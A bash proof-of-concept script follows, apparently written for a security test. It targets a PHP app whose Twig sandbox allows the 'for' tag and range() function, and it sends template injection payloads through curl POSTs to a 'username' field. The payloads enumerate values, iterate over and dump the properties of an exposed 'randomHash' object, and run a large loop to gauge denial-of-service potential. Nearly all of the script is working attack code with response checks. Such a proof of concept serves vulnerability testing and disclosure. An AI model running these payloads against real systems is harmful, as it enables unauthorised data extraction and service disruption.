#!/bin/bash

# POC: Twig Sandbox Bypass via FOR Loop and range() Function Enumeration
# Target: index.php with Twig sandbox configured to allow 'for' tag and 'range' function
# This demonstrates how FOR loops can enumerate and extract object data

TARGET_URL="${1:-http://localhost:8080/app/index.php}"
OUTPUT_FILE="/tmp/twig_poc_output.txt"

echo "[*] Twig Sandbox Bypass - FOR Loop Enumeration POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Basic range enumeration
echo "[+] Test 1: Basic range() enumeration (enumerate values 0-20)"
PAYLOAD1='{% for i in range(0,20) %}{{ i }},{% endfor %}'
echo "[*] Payload: $PAYLOAD1"

RESPONSE1=$(curl -s -X POST "$TARGET_URL" \
  -d "username=$PAYLOAD1" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)

echo "[*] Response snippet:"
echo "$RESPONSE1" | head -20
echo ""

# Check if range enumeration worked (should output 0,1,2,3,...)
if echo "$RESPONSE1" | grep -q "0,1,2,3"; then
    echo "[+] SUCCESS: FOR loop with range() executed and enumerated values"
else
    echo "[-] FAILED: Expected enumeration output not found"
fi

echo ""
echo "---"
echo ""

# Test 2: Object property iteration (if randomHash object is exposed)
echo "[+] Test 2: Object property iteration via FOR loop"
PAYLOAD2='{% for key,val in randomHash %}{{ key }}:{{ val }}|{% endfor %}'
echo "[*] Payload: $PAYLOAD2"

RESPONSE2=$(curl -s -X POST "$TARGET_URL" \
  -d "username=$PAYLOAD2" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)

echo "[*] Response snippet:"
echo "$RESPONSE2" | head -20
echo ""

if echo "$RESPONSE2" | grep -q ":"; then
    echo "[+] SUCCESS: FOR loop enumerated object properties"
    echo "[+] Extracted data structure visible in output"
else
    echo "[-] Could not enumerate object properties (object may not be iterable)"
fi

echo ""
echo "---"
echo ""

# Test 3: Nested FOR loops with complex patterns
echo "[+] Test 3: Nested FOR loops for complex enumeration patterns"
PAYLOAD3='{% for i in range(1,5) %}{% for j in range(1,4) %}({{ i }},{{ j }}){% endfor %};{% endfor %}'
echo "[*] Payload: $PAYLOAD3"

RESPONSE3=$(curl -s -X POST "$TARGET_URL" \
  -d "username=$PAYLOAD3" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)

echo "[*] Response snippet:"
echo "$RESPONSE3" | head -20
echo ""

if echo "$RESPONSE3" | grep -q "(1,1)"; then
    echo "[+] SUCCESS: Nested FOR loops executed without restriction"
    echo "[+] Complex enumeration patterns are possible"
else
    echo "[-] Nested loops may be restricted"
fi

echo ""
echo "---"
echo ""

# Test 4: FOR loop combined with dump() to extract object structure
echo "[+] Test 4: FOR loop with dump() for object introspection"
PAYLOAD4='{% for key in randomHash|keys %}{{ key }}: {{ dump(randomHash[key]) }}<br>{% endfor %}'
echo "[*] Payload: $PAYLOAD4"

RESPONSE4=$(curl -s -X POST "$TARGET_URL" \
  -d "username=$PAYLOAD4" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)

echo "[*] Response snippet:"
echo "$RESPONSE4" | head -30
echo ""

if echo "$RESPONSE4" | grep -q "object\|array\|string"; then
    echo "[+] SUCCESS: FOR loop combined with dump() reveals object structure"
    echo "[+] Data extraction attack successful"
else
    echo "[-] Could not extract structured data"
fi

echo ""
echo "---"
echo ""

# Test 5: Range enumeration to test DoS potential
echo "[+] Test 5: Large range enumeration (DoS potential)"
PAYLOAD5='{% for i in range(0,1000) %}X{% endfor %}'
echo "[*] Payload: Large range 0-1000"

RESPONSE5=$(curl -s -X POST "$TARGET_URL" \
  -d "username=$PAYLOAD5" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --max-time 5 2>&1)

RESPONSE_LENGTH=$(echo "$RESPONSE5" | wc -c)
echo "[*] Response size: $RESPONSE_LENGTH bytes"

if [ "$RESPONSE_LENGTH" -gt 1000 ]; then
    echo "[+] WARNING: Large output generated from range enumeration"
    echo "[+] DoS potential through exhaustive loops detected"
else
    echo "[-] Loop restriction may limit output"
fi

echo ""
echo "[*] POC Complete"
echo "[*] Summary: FOR loops and range() function allow:"
echo "    - Unrestricted value enumeration"
echo "    - Object property iteration and extraction"
echo "    - Nested loop complex patterns"
echo "    - Combined attacks with dump()"
echo "    - Potential DoS via large loops"